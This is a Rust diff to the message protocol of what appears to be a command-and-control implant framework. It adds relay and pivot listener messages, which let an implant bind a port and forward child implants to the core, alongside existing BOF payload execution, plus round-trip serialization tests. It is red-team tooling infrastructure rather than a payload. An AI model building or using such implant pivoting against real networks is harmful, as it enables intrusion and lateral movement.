@@ -8,7 +8,7 @@ use serde::{Deserialize, Serialize};
 
 /// Messages flowing server -> implant.
 #[derive(Debug, Clone, Serialize, Deserialize)]
-#[serde(tag = "type", rename_all = "lowercase")]
+#[serde(tag = "type", rename_all = "snake_case")]
 pub enum ServerMessage {
     /// Operator typed `hello` — link check. Implant echoes back.
     Hello,
@@ -16,11 +16,28 @@ pub enum ServerMessage {
     /// argument buffer — both base64-encoded (args is binary, not text: the
     /// CS/AdaptixC2 packed format walked by BeaconDataParse/Extract/Int).
     Bof { file: String, args: String },
+    /// Start a TCP pivot/relay listener on the implant. The implant binds
+    /// `bind_ip:port` (port 0 = OS-assigned), spawns an accept loop, and
+    /// replies `RelayStarted` with the actual port. Each accepted child
+    /// connection is spliced onto a fresh connection to the core, so the child
+    /// appears as a normal new implant at the core (transparent pivot). The
+    /// `relay_id` is core-assigned so the core can correlate the async reply.
+    RelayListen {
+        relay_id: String,
+        bind_ip: String,
+        #[serde(default)]
+        port: u16,
+    },
+    /// Stop a previously-started relay listener. Idempotent: an unknown id
+    /// still yields `RelayStopped`.
+    RelayStop {
+        relay_id: String,
+    },
 }
 
 /// Messages flowing implant -> server.
 #[derive(Debug, Clone, Serialize, Deserialize)]
-#[serde(tag = "type", rename_all = "lowercase")]
+#[serde(tag = "type", rename_all = "snake_case")]
 pub enum ImplantMessage {
     /// Reply to a `Hello` from the operator.
     Hello { data: String },
@@ -28,6 +45,22 @@ pub enum ImplantMessage {
     Output { data: String },
     /// Error surfaced while handling a request.
     Error { data: String },
+    /// Relay listener is up. `port` is the actual bound port (matters when the
+    /// request asked for port 0 = auto).
+    RelayStarted {
+        relay_id: String,
+        bind_ip: String,
+        port: u16,
+    },
+    /// Relay listener stopped (clean stop or unknown id).
+    RelayStopped {
+        relay_id: String,
+    },
+    /// Relay listener failed to start (e.g. port taken).
+    RelayError {
+        relay_id: String,
+        data: String,
+    },
 }
 
 impl ServerMessage {
@@ -90,5 +123,61 @@ mod tests {
         let enc = encode_bof(&raw);
         let dec = decode_bof(&enc).unwrap();
         assert_eq!(dec, raw);
+    }
+
+    #[test]
+    fn roundtrip_relay_messages() {
+        let listen = ServerMessage::RelayListen {
+            relay_id: "rl-abcd".into(),
+            bind_ip: "0.0.0.0".into(),
+            port: 0,
+        };
+        let s = listen.to_json();
+        assert!(s.contains("\"type\":\"relay_listen\""), "{s}");
+        assert!(s.contains("\"relay_id\":\"rl-abcd\""), "{s}");
+        let back: ServerMessage = serde_json::from_str(&s).unwrap();
+        match back {
+            ServerMessage::RelayListen { relay_id, bind_ip, port } => {
+                assert_eq!(relay_id, "rl-abcd");
+                assert_eq!(bind_ip, "0.0.0.0");
+                assert_eq!(port, 0);
+            }
+            _ => panic!("wrong variant"),
+        }
+
+        let stop = ServerMessage::RelayStop { relay_id: "rl-abcd".into() };
+        let s = stop.to_json();
+        assert!(s.contains("\"type\":\"relay_stop\""), "{s}");
+        let back: ServerMessage = serde_json::from_str(&s).unwrap();
+        match back {
+            ServerMessage::RelayStop { relay_id } => assert_eq!(relay_id, "rl-abcd"),
+            _ => panic!("wrong variant"),
+        }
+
+        let started = ImplantMessage::RelayStarted {
+            relay_id: "rl-abcd".into(),
+            bind_ip: "0.0.0.0".into(),
+            port: 51234,
+        };
+        let s = started.to_json();
+        assert!(s.contains("\"type\":\"relay_started\""), "{s}");
+        assert!(s.contains("\"port\":51234"), "{s}");
+        let back: ImplantMessage = serde_json::from_str(&s).unwrap();
+        match back {
+            ImplantMessage::RelayStarted { port, .. } => assert_eq!(port, 51234),
+            _ => panic!("wrong variant"),
+        }
+
+        let err = ImplantMessage::RelayError {
+            relay_id: "rl-abcd".into(),
+            data: "bind failed".into(),
+        };
+        let s = err.to_json();
+        assert!(s.contains("\"type\":\"relay_error\""), "{s}");
+        assert!(s.contains("\"data\":\"bind failed\""), "{s}");
+
+        let stopped = ImplantMessage::RelayStopped { relay_id: "rl-abcd".into() };
+        let s = stopped.to_json();
+        assert!(s.contains("\"type\":\"relay_stopped\""), "{s}");
     }
 }
